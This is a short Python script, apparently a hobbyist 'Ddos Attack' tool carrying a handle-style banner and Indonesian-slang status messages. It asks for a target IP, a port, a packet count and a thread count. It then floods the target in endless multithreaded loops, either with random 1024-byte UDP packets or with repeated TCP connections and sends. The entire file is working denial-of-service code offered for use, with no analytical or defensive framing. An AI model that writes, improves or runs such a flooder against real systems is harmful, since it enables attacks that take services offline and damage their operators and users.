import random
import socket
import threading

print("\033[92m")
print("""
    Tools by:

ɀȺჯǶ ჯ ɀȺɀȺ

""")
print("\033[97m")
ip= str(input(" ip :"))
port= int(input(" port :"))
choice = str(input(" Ddos Attack?? (y/n):"))
times= int(input(" Paket :"))
threads= int(input(" threads :"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ZAXH X ZAZA!!!!!")
		except:
			print("[!] SERVERNYA TURU DEK? (ɀȺჯǶ ჯ ɀȺɀȺ)")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ZAXH X ZAZA!!!!!")
		except:
			s.close()
			print("[*] SERVERNYA TURU DEK? (ɀȺჯǶ ჯ ɀȺɀȺ)")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
